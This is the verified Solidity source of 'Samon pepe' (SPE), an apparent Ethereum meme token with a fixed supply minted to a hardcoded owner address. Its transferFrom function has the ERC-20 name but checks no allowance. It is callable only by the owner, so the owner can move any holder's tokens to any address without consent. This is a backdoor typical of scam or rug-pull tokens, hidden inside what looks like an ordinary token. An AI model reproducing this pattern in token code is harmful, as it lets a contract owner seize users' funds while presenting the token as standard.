/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SamonPepeToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    address public owner;
    mapping(address => uint256) public balanceOf;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }
    
    constructor() {
        name = "Samon pepe";
        symbol = "SPE";
        decimals = 18;
        totalSupply = 100000 * 10**uint256(decimals);
        owner = 0xbDE7dFa07EedAC48dc7c8721D83bBa6Ea78f5c31;
        balanceOf[owner] = totalSupply;
    }
    
    function transfer(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        require(_to != address(0), "Invalid address");
        
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        
        emit Transfer(msg.sender, _to, _value);
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public onlyOwner {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(_to != address(0), "Invalid address");
        
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        
        emit Transfer(_from, _to, _value);
      
    }
}